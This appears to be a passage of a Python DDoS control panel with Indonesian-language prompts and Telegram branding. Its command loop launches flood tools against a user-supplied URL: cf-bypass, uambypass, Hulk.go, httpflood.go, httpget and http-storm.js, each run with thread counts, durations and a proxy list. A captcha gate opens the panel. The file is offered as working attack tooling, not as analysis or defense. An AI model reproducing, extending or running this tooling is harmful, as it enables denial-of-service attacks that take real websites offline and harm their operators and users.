               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cf-bypass
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cf-bypass <url> <waktu>')
                print('Contoh: cf-bypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "uambypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node uambypass.js {url} {time} 1250 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: uambypass
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: uambypass <url> <waktu>')
                print('Contoh: uambypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run Hulk.go -site {url} -data {method}')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node httpget GET {url} {time} 100 100 proxies.txt')
               os.system(f'node httpgetv2 GET {url} {time} 100 100 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpget
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: httpget <url> <waktu>')
                print('Contoh: httpget http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
                
        elif "http-storm" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node http-storm.js {url} {time} 100 100 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: http-storm
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: http-storm <url> <waktu>')
                print('Contoh: http-storm http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
            else:
                print(f"Unknown command: '{cnc}'. Type 'usage' for available commands.")                                                                                                                                                                                    

def generate_and_verify_captcha(length=4):
    while True:
        characters = string.ascii_uppercase
        captcha = ''.join(random.choice(characters) for _ in range(length))

        clear_screen()
        print("\n" + "="*30)
        print(f"{'CAPCTHA UNTUK VERIFIKASI'.center(30)}")
        print("="*30 + "\n")

        print(colored(f"   {captcha}   ", "green", attrs=["bold", "reverse"]))

        print("\n" + "="*30)
        user_input = input("Masukkan captcha di atas: ".ljust(30))

        if captcha == user_input.upper():
            print(colored("\nCaptcha benar!", "green"))
            time.sleep(1) # Beri jeda agar user bisa melihat pesan 'Captcha benar!'
            return True
        else:
            print(colored("\nCaptcha salah. Silakan coba lagi.", "red"))
            input("Tekan Enter untuk melanjutkan...")

def login():
    clear_screen()
    print("Memulai verifikasi CAPTCHA untuk akses script...")

    # Verifikasi CAPTCHA
    if generate_and_verify_captcha(): # Jika CAPTCHA benar, generate_and_verify_captcha akan mengembalikan True
        print(colored("Akses Diberikan! Memasuki script utama...", "green", attrs=["bold"]))
        time.sleep(1) # Jeda sebentar sebelum masuk ke script utama
        main() # Langsung panggil fungsi main()
        return True # Menandakan proses login (verifikasi captcha) berhasil
    else:
        # Bagian ini hanya akan tercapai jika generate_and_verify_captcha memiliki cara untuk gagal secara total
        # (misalnya, setelah beberapa kali percobaan gagal, atau jika loop di dalamnya dihentikan)
        # Dengan implementasi saat ini, generate_and_verify_captcha akan terus berulang sampai benar.
        # Jadi, bagian 'else' ini mungkin tidak akan pernah terpanggil secara normal.
        print(colored("Verifikasi CAPTCHA gagal. Tidak dapat melanjutkan.", "red", attrs=["bold"]))
        return False

if __name__ == "__main__":
    if login():
        print("WELCOME TO DDOS PANEL") # Pesan ini akan muncul setelah main() selesai dieksekusi
    else:
        print("Script tidak dapat diakses.")                                                                                          